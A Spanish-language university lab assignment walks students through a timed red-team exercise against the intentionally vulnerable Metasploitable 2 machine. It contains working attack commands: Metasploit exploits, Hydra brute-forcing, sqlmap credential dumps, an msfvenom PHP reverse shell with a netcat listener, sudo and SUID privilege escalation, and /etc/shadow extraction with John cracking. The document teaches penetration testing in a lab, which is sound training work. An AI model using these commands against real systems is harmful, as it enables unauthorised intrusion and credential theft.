| :- | :- |

**Práctica Nro. 9**

**Pentesting Integral: Metodología de Red Team Assessment**

**(Reconocimiento, Análisis de Vulnerabilidades, Explotación y
Post-Explotación con Nmap, Metasploit, SQLMap, Hydra y Técnicas de
Escalada de Privilegios)**

**CONTEXTO DEL ESCENARIO**

**TechVault Industries** es una empresa de servicios financieros que ha
detectado actividad sospechosa en su red. Como equipo de **Red Team**,
han sido contratados para simular un ataque APT (Advanced Persistent
Threat) completo y evaluar la postura de seguridad real de la
organización.

Su misión: **Desde reconocimiento inicial hasta exfiltración de datos,
en 60 minutos.**

**OBJETIVOS DE APRENDIZAJE**

Al completar esta práctica integradora, demostrarás:

-   **Metodología completa de pentesting** (Reconocimiento → Explotación
    → Post-explotación)

-   **Toma de decisiones técnicas** bajo presión de tiempo

-   **Integración de múltiples herramientas** de forma coherente

-   **Documentación profesional** de hallazgos críticos

-   **Pensamiento estratégico** en ciberseguridad ofensiva

**REQUISITOS TÉCNICOS**

**Entorno de Laboratorio**

-   **Kali Linux** (Máquina atacante)

-   **Metasploitable 2** (Objetivo principal)

-   **Conexión de red** configurada (NAT/Host-Only)

-   **Herramientas verificadas**: Nmap, Metasploit, Hydra, Nikto,
    SQLMap, Dirb, John the Ripper

**Verificación Previa**

\# En Kali Linux, ejecutar antes de comenzar

\# 1. Verificar tu IP

ip addr show

>\# Anotar la IP de Metasploitable 2 \<TU_IP\>
192.168.100.20/24

\# 2. Verificar conectividad con Metasploitable 2

ping \<IP_METASPLOITABLE\>

>\# Deberías recibir respuestas (ping exitoso)

``` shell
    PING 192.168.100.20 (192.168.100.20) 56(84) bytes of data.
    64 bytes from 192.168.100.20: icmp_seq=1 ttl=64 time=0.710 ms
    64 bytes from 192.168.100.20: icmp_seq=2 ttl=64 time=0.791 ms
    64 bytes from 192.168.100.20: icmp_seq=3 ttl=64 time=0.876 ms
    64 bytes from 192.168.100.20: icmp_seq=4 ttl=64 time=0.892 ms
    64 bytes from 192.168.100.20: icmp_seq=5 ttl=64 time=0.896 ms
    64 bytes from 192.168.100.20: icmp_seq=6 ttl=64 time=0.825 ms
    64 bytes from 192.168.100.20: icmp_seq=7 ttl=64 time=1.10 ms
```
\# Ctrl+C para detener el ping

\# 3. Verificar herramientas instaladas

msfconsole -v

``` shell
    └─$ msfconsole -v
    Framework Version: 6.3.55-dev

```

which nmap sqlmap hydra nikto dirb john

``` shell
└─$ which nmap sqlmap hydra nikto dirb john
    /usr/bin/nmap
    /usr/bin/sqlmap
    /usr/bin/hydra
    /usr/bin/nikto
    /usr/bin/dirb
    /usr/sbin/john
```

\# 4. Verificar que Metasploitable 2 esté completamente iniciado

\# (Esperar al menos 2 minutos después del boot)

**\
**

**ESTRUCTURA TEMPORAL (60 minutos)**

  -----------------------------------------------------------------------
  FASE        TIEMPO        ACTIVIDAD
  ----------- ------------- ---------------------------------------------
  Fase 1      10 min        Reconocimiento y Enumeración

  Fase 2      15 min        Análisis de Vulnerabilidades

  Fase 3      20 min        Explotación y Acceso

  Fase 4      10 min        Post-Explotación y Evidencias

  Fase 5      5 min         Documentación Final
  -----------------------------------------------------------------------

**FASE 1: RECONOCIMIENTO Y ENUMERACIÓN (10 minutos)**

**Objetivo**

Identificar la superficie de ataque completa: servicios, versiones,
tecnologías web y posibles vectores de entrada.

**Tareas**

**1.1 Descubrimiento de Servicios (3 min)**

\# Escaneo rápido y agresivo

nmap -sV -sC -T4 -p- \--min-rate 5000 \192.168.100.20 -oN recon_full.txt

>\# escaneo completo de puertos y servicios
``` shell
    nmap -sV -sC -T4 -p- \--min-rate 5000 \192.168.100.20 -oN recon_full.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-21 08:45 EST
Nmap scan report for 192.168.100.20
Host is up (0.00050s latency).
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.100.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_ssl-date: 2025-11-21T09:47:44+00:00; -4h00m00s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      39606/tcp   mountd
|   100005  1,2,3      47967/udp   mountd
|   100021  1,3,4      39392/udp   nlockmgr
|   100021  1,3,4      50976/tcp   nlockmgr
|   100024  1          33720/udp   status
|_  100024  1          56539/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  shell       Netkit rshd
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: LongColumnFlag, SupportsCompression, Speaks41ProtocolNew, SupportsTransactions, Support41Auth, SwitchToSSLAfterHandshake, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: nu"CmzAq8_VrZJF`/iFa
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2025-11-21T09:47:44+00:00; -4h00m00s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
39606/tcp open  mountd      1-3 (RPC #100005)
50976/tcp open  nlockmgr    1-4 (RPC #100021)
55460/tcp open  java-rmi    GNU Classpath grmiregistry
56539/tcp open  status      1 (RPC #100024)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: -2h45m00s, deviation: 2h30m00s, median: -4h00m00s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-11-21T04:47:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.98 second

```

\# Análisis rápido de resultados

cat recon_full.txt | grep "open"

>\#  resultado
``` shell
 cat recon_full.txt | grep "open"
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  shell       Netkit rshd
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
39606/tcp open  mountd      1-3 (RPC #100005)
50976/tcp open  nlockmgr    1-4 (RPC #100021)
55460/tcp open  java-rmi    GNU Classpath grmiregistry
56539/tcp open  status      1 (RPC #100024)
```


**Documenta:**

-   ¿Cuántos servicios están expuestos?

-   Identifica al menos 3 servicios con versiones conocidas vulnerables

**1.2 Enumeración Web (4 min)**

\# Identificar tecnologías web

whatweb http://192.168.100.20

>\# resultado
``` shell
└─$ whatweb http://192.168.100.20
http://192.168.100.20 [200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], IP[192.168.100.20], PHP[5.2.4-2ubuntu5.10], Title[Metasploitable2 - Linux], WebDAV[2], X-Powered-By[PHP/5.2.4-2ubuntu5.10]
```

\# Descubrimiento de directorios críticos

dirb http://192.168.100.20 /usr/share/wordlists/dirb/common.txt -r -o dirb_results.txt

>\# resultado (extracto)
``` shell
└─$ dirb http://192.168.100.20 /usr/share/wordlists/dirb/common.txt -r -o dirb_results.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb_results.txt
START_TIME: Fri Nov 21 08:56:48 2025
URL_BASE: http://192.168.100.20/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
OPTION: Not Recursive

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.100.20/ ----
                                                                             + http://192.168.100.20/cgi-bin/ (CODE:403|SIZE:295)                        
                                                                             ==> DIRECTORY: http://192.168.100.20/dav/
+ http://192.168.100.20/index (CODE:200|SIZE:891)                           
+ http://192.168.100.20/index.php (CODE:200|SIZE:891)                       
+ http://192.168.100.20/phpinfo (CODE:200|SIZE:48089)                       
+ http://192.168.100.20/phpinfo.php (CODE:200|SIZE:48101)                   
                                                                             ==> DIRECTORY: http://192.168.100.20/phpMyAdmin/
+ http://192.168.100.20/server-status (CODE:403|SIZE:300)                   
                                                                             ==> DIRECTORY: http://192.168.100.20/test/
                                                                             ==> DIRECTORY: http://192.168.100.20/twiki/
                                                                               
-----------------
END_TIME: Fri Nov 21 08:56:50 2025
DOWNLOADED: 4612 - FOUND: 6
```

**Documenta:**

-   ¿Qué servidor web y versión detectaste?

-   Lista 3 directorios/archivos interesantes encontrados

**1.3 Enumeración de Usuarios (3 min)**

\# Si hay servicio FTP anónimo

ftp 192.168.100.20

\# Usuario: anonymous / Contraseña: \[Enter\]

>\#  dentro de FTP:
``` shell
└─$ ftp 192.168.100.20                                                   
Connected to 192.168.100.20.
220 (vsFTPd 2.3.4)
Name (192.168.100.20:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

\# Si hay SMB/Samba

enum4linux -a 192.168.100.20 | tee enum4linux_results.txt

**Documenta:**

-   ¿Encontraste usuarios del sistema?

-   ¿Hay servicios con acceso anónimo?

**FASE 2: ANÁLISIS DE VULNERABILIDADES (15 minutos)**

**Objetivo**

Identificar vulnerabilidades explotables en servicios de red y
aplicaciones web, priorizando por criticidad.

**Tareas**

**2.1 Escaneo de Vulnerabilidades de Red (5 min)**

\# Búsqueda de exploits conocidos para servicios detectados

searchsploit \<nombre_servicio\> \<versión\>

\# Ejemplo:

searchsploit vsftpd 2.3.4

>\# Escaneo de vulnerabilidades de vsftpd
``` shell
 searchsploit vsftpd 2.3.4
 ------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
------------------------------------------- ---------------------------------
Shellcodes: No Results
```
searchsploit samba 3.0.20

>\# Escaneo de vulnerabiliddades de samba

``` shell
 searchsploit samba 3.0.20
 ------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Sec | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (P | linux_x86/dos/36741.py
------------------------------------------- ---------------------------------
Shellcodes: No Results
```
![alt text](image.png)

searchsploit apache 2.2

>\# Escaneo de vulnerabiliddades de apache

``` shell
 searchsploit apache 2.2
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin  | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote C | php/remote/29316.py
Apache 1.3.35/2.0.58/2.2.2 - Arbitrary HTT | linux/remote/28424.txt
Apache 1.4/2.2.x - APR 'apr_fnmatch()' Den | linux/dos/35738.php
Apache 2.2 (Windows) - Local Denial of Ser | windows/dos/15319.pl
Apache 2.2 - Scoreboard Invalid Free On Sh | linux/dos/41768.txt
Apache 2.2.14 mod_isapi - Dangling Pointer | windows/remote/11650.c
Apache 2.2.15 mod_proxy - Reverse Proxy Se | linux/remote/36663.txt
Apache 2.2.2 - CGI Script Source Code Info | multiple/remote/28365.txt
Apache 2.2.4 - 413 Error HTTP Request Meth | unix/remote/30835.sh
Apache 2.2.6 (Windows) - Share PHP File Ex | windows/remote/30901.txt
Apache 2.2.6 mod_negotiation - HTML Inject | linux/remote/31052.java
Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - | multiple/remote/2237.sh
Apache < 2.0.64 / < 2.2.21 mod_setenvif -  | linux/dos/41769.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memor | linux/webapps/42745.py
Apache cocoon 2.14/2.2 - Directory Travers | multiple/remote/23282.txt
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial o | multiple/dos/26710.txt
Apache James Server 2.2 - SMTP Denial of S | multiple/dos/27915.pl
Apache mod_gzip (with debug_mode) 1.2.26.1 | linux/remote/126.c
Apache mod_jk 1.2.19/1.2.20 - Remote Buffe | multiple/remote/4093.pl
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' | linux/webapps/39642.txt
Apache Struts 2 < 2.3.1 - Multiple Vulnera | multiple/webapps/18329.txt
Apache Struts 2.0.0 < 2.2.1.1 - XWork 's:s | multiple/remote/35735.txt
Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2.5.1 | multiple/remote/44556.py
Apache Struts 2.2.1.1 - Remote Command Exe | multiple/remote/18984.rb
Apache Struts 2.2.3 - Multiple Open Redire | multiple/remote/38666.txt
Apache Struts < 1.3.10 / < 2.3.16.2 - Clas | multiple/remote/41690.rb
Apache Struts < 2.2.0 - Remote Command Exe | multiple/remote/17691.rb
Apache Struts2 2.0.0 < 2.3.15 - Prefixed P | multiple/webapps/44583.txt
Apache Tomcat < 5.5.17 - Remote Directory  | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory  | multiple/remote/6229.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory  | unix/remote/14489.c
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 /  | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 /  | windows/webapps/42953.txt
Apache Tomcat mod_jk 1.2.20 - Remote Buffe | windows/remote/16798.rb
Apache Xerces-C XML Parser < 3.1.2 - Denia | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local  | linux/remote/34.pl
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

**Documenta:**

-   Identifica al menos 2 CVEs críticos (CVSS ≥ 7.0)

-   ¿Qué servicios tienen exploits públicos disponibles?

**2.2 Análisis de Vulnerabilidades Web (10 min)**

**Opción A: Escaneo automatizado**

nikto -h http://192.168.100.20 -o nikto_scan.txt

**Opción B: Búsqueda manual de SQL Injection**

\# Identifica formularios de login o parámetros GET

\# Ejemplo: http://\<IP_TARGET\>/mutillidae/index.php?page=login.php

\# Prueba básica de SQLi

sqlmap -u
\"http://\<IP_TARGET\>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\"
\\

\--cookie=\"PHPSESSID=\<tu_session\>; security=low\" \\

\--dbs \--batch

**Documenta:**

-   ¿Qué vulnerabilidades web críticas encontraste? (SQLi, XSS,
    Directory Traversal, etc.)

-   ¿Hay bases de datos accesibles vía SQLi?

**\
**

**FASE 3: EXPLOTACIÓN Y ACCESO (20 minutos)**

**Objetivo**

Obtener acceso inicial al sistema mediante explotación de
vulnerabilidades identificadas.

**Tareas -- ELIJAN USTEDES EL VECTOR DE ATAQUE**

Debes completar **AL MENOS 2 de las siguientes 4 opciones** según lo que
hayas descubierto:

**OPCIÓN A: Explotación de Servicio Vulnerable (8 min)**

msfconsole

\# Ejemplo para vsftpd 2.3.4

![alt text](image-1.png)

msf6 \> search vsftpd

``` shell

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor                                            

```

msf6 \> use exploit/unix/ftp/vsftpd_234_backdoor

msf6 exploit(vsftpd_234_backdoor) \> set RHOSTS 192.168.100.20

msf6 exploit(vsftpd_234_backdoor) \> set PAYLOAD cmd/unix/interact

msf6 exploit(vsftpd_234_backdoor) \> exploit

![alt text](image-3.png)

\# O para Samba

msf6 \> use exploit/multi/samba/usermap_script

msf6 exploit(usermap_script) \> set RHOSTS \<IP_TARGET\>

msf6 exploit(usermap_script) \> set PAYLOAD cmd/unix/reverse

msf6 exploit(usermap_script) \> exploit

**Documenta:**

-   ¿Qué exploit utilizaste y por qué?

-   ¿Obtuviste shell? ¿Con qué privilegios?

**OPCIÓN B: Ataque de Fuerza Bruta (8 min)**

\# Crear lista de usuarios (si los obtuviste en Fase 1)

echo \"msfadmin\" \> users.txt

echo \"user\" \>\> users.txt

echo \"postgres\" \>\> users.txt

\# Ataque a SSH

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\

ssh://\<IP_TARGET\> -t 4 -V

\# O ataque a FTP

hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt
\\

ftp://\<IP_TARGET\> -t 4

**Documenta:**

-   ¿Qué credenciales válidas encontraste?

-   Accede al sistema con las credenciales: ssh usuario@\<IP_TARGET\>

**OPCIÓN C: Explotación de SQL Injection (8 min)**

\# Enumerar bases de datos

sqlmap -u \"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\"
\\

``` shell
└─$         ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:20:15 /2025-11-21/

[09:20:16] [CRITICAL] invalid target URL
[09:20:16] [WARNING] your sqlmap version is outdated

[*] ending @ 09:20:16 /2025-11-21/


[1]  + done       sqlmap -u \"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1
```

![alt text](image-4.png)

\--cookie=\"security=low\" \--dbs \--batch

\# Enumerar tablas de una BD específica

sqlmap -u
\"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\"
\\

\--cookie=\"security=low\" -D dvwa \--tables \--batch

\# Extraer datos de tabla users

sqlmap -u
\"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\"
\\

\--cookie=\"security=low\" -D dvwa -T users \--dump \--batch

**Documenta:**

-   ¿Qué bases de datos existen?

-   Extrae y documenta al menos 3 credenciales de usuarios

**OPCIÓN D: Explotación Web + Reverse Shell (8 min)**

\# Buscar upload de archivos o command injection

\# Crear payload PHP

msfvenom -p php/reverse_php LHOST=\<TU_IP\> LPORT=4444 -f raw \>
shell.php

\# Configurar listener

nc -lvnp 4444

\# Subir shell.php mediante vulnerabilidad de upload

\# O explotar command injection si existe

**Documenta:**

-   ¿Qué vulnerabilidad web explotaste?

-   ¿Obtuviste reverse shell?

**\
**

**FASE 4: POST-EXPLOTACIÓN Y EVIDENCIAS (10 minutos)**

**Objetivo**

Escalar privilegios, mantener persistencia y extraer información
sensible.

**Tareas**

**4.1 Reconocimiento Interno (3 min)**

\# Una vez dentro del sistema

whoami

id

uname -a

cat /etc/passwd

sudo -l

**Documenta:**

-   ¿Con qué usuario accediste?

-   ¿Tiene permisos sudo?

**4.2 Escalada de Privilegios (4 min)**

**Opción 1: Exploit de kernel**

\# Identificar versión de kernel

uname -r

\# Buscar exploit

searchsploit linux kernel \<versión\>

**Opción 2: Permisos sudo mal configurados**

sudo -l

\# Si ves algo como: (root) NOPASSWD: /usr/bin/nmap

sudo nmap \--interactive

nmap\> !sh

**Opción 3: SUID binaries**

find / -perm -4000 2\>/dev/null

\# Busca binarios inusuales con SUID

**Documenta:**

-   ¿Lograste root? ¿Cómo?

-   Captura evidencia: cat /root/proof.txt o cat /etc/shadow

**4.3 Exfiltración de Datos (3 min)**

\# Extraer archivos sensibles

cat /etc/shadow \> /tmp/shadow.txt

cat /etc/passwd \> /tmp/passwd.txt

\# Buscar archivos interesantes

find /home -name \"\*.txt\" -o -name \"\*.pdf\" 2\>/dev/null

find / -name \"\*password\*\" 2\>/dev/null \| head -20

\# Crackear hashes (si tienes tiempo)

unshadow /etc/passwd /etc/shadow \> hashes.txt

john hashes.txt \--wordlist=/usr/share/wordlists/rockyou.txt

**Documenta:**

-   ¿Qué información sensible encontraste?

-   ¿Crackeaste alguna contraseña?

**FASE 5: DOCUMENTACIÓN FINAL (5 minutos)**

**Objetivo**

Generar un reporte ejecutivo profesional de los hallazgos. Debes
entregarlo en MarkDown (.md)

**Template de Reporte (en MarkDown)**

**\# REPORTE DE PENTESTING - OPERACIÓN CIPHER BREACH**

**\*\*Analistas:\*\*** \[Sus nombres\]

**\*\*Fecha:\*\*** \[Fecha actual\]

**\*\*Objetivo:\*\*** \[IP de Metasploitable\]

**\*\*Tiempo total:\*\*** 60 minutos

\-\--

**\## 1. RESUMEN EJECUTIVO**

\[2-3 líneas describiendo el nivel de compromiso logrado\]

**\## 2. HALLAZGOS CRÍTICOS**

**\### Vulnerabilidad #1: \[Nombre\]**

\- **\*\*Severidad:\*\*** CRÍTICA/ALTA/MEDIA

\- **\*\*CVE:\*\*** \[Si aplica\]

\- **\*\*Servicio afectado:\*\*** \[Puerto y servicio\]

\- **\*\*Descripción:\*\*** \[Breve explicación\]

\- **\*\*Evidencia:\*\*** \[Comando o screenshot\]

**\### Vulnerabilidad #2: \[Nombre\]**

\[Repetir estructura\]

**\### Vulnerabilidad #3: \[Nombre\]**

\[Repetir estructura\]

**\## 3. CADENA DE EXPLOTACIÓN**

1\. Reconocimiento: \[Herramienta usada\] → \[Hallazgo clave\]

2\. Acceso inicial: \[Vector de ataque\] → \[Resultado\]

3\. Escalada: \[Técnica usada\] → \[Privilegios obtenidos\]

4\. Exfiltración: \[Datos extraídos\]

**\## 4. DATOS SENSIBLES COMPROMETIDOS**

\- Usuarios del sistema: \[Cantidad\]

\- Hashes extraídos: \[Cantidad\]

\- Contraseñas crackeadas: \[Cantidad\]

\- Archivos críticos: \[Lista\]

**\## 5. RECOMENDACIONES (Top 3)**

1\. \[Recomendación más crítica\]

2\. \[Segunda recomendación\]

3\. \[Tercera recomendación\]

**\## 6. TIMELINE DEL ATAQUE**

\- 00:00 - 10:00 → Reconocimiento

\- 10:00 - 25:00 → Análisis de vulnerabilidades

\- 25:00 - 45:00 → Explotación

\- 45:00 - 55:00 → Post-explotación

\- 55:00 - 60:00 → Documentación

\-\--

**\*\*Conclusión:\*\*** \[1-2 líneas sobre la postura de seguridad del
objetivo\]

**SECCIÓN DE CONCLUSIÓN Y REFLEXIÓN CRÍTICA**

**ANÁLISIS POST-PRÁCTICA**

Una vez completada la Operación \"CIPHER BREACH\", es fundamental que
reflexionen sobre la experiencia, analicen decisiones técnicas y
profundicen en conceptos de ciberseguridad. Esta sección está diseñada
para desarrollar pensamiento crítico y comprensión estratégica más allá
de la ejecución técnica.

**Nota importante:** Como equipo de dos analistas, deben discutir y
consensuar sus respuestas, integrando las perspectivas de ambos miembros
del equipo.

**PREGUNTAS DE REFLEXIÓN Y ANÁLISIS CRÍTICO**

**BLOQUE 1: METODOLOGÍA Y TOMA DE DECISIONES (Preguntas 1-3)**

**1. Análisis de la Cadena de Ataque**

Revisen su timeline de ataque y respondan:

a\) ¿Cuál fue el vector de entrada más efectivo que utilizaron y por
qué?

b\) Si tuvieran que repetir el ejercicio, ¿cambiarían el orden de sus
acciones? ¿Por qué?

c\) ¿En qué momento del ataque consideraron que habían \"comprometido\"
realmente el sistema? Justifiquen su respuesta.

d\) **Trabajo en equipo:** ¿Cómo dividieron las tareas entre ustedes
dos? ¿Fue efectiva esa división del trabajo?

**2. Gestión del Tiempo y Priorización**

Durante los 60 minutos de práctica:

a\) ¿Qué fase consumió más tiempo del esperado? ¿Por qué creen que
ocurrió esto?

b\) ¿Hubo algún momento en que se quedaron \"atascados\" en una técnica
específica? ¿Cómo lo resolvieron como equipo?

c\) Si tuvieran solo 30 minutos en lugar de 60, ¿qué técnicas
eliminarían y cuáles mantendrían como prioritarias?

d\) **Reflexión estratégica:** En un engagement real de Red Team, ¿cómo
balancearían la velocidad del ataque con la necesidad de evitar
detección?

e\) **Dinámica de equipo:** ¿Hubo momentos de desacuerdo sobre qué
técnica usar? ¿Cómo los resolvieron?

**3. Comparación de Vectores de Ataque**

Considerando las 4 opciones de explotación presentadas (vsftpd, Samba,
SSH brute force, SQL Injection):

a\) Clasifíquenlas de mayor a menor efectividad según su experiencia.
Justifiquen su ranking.

b\) ¿Cuál vector sería más difícil de detectar por un equipo de Blue
Team? ¿Por qué?

c\) ¿Cuál vector requiere más habilidad técnica del atacante?

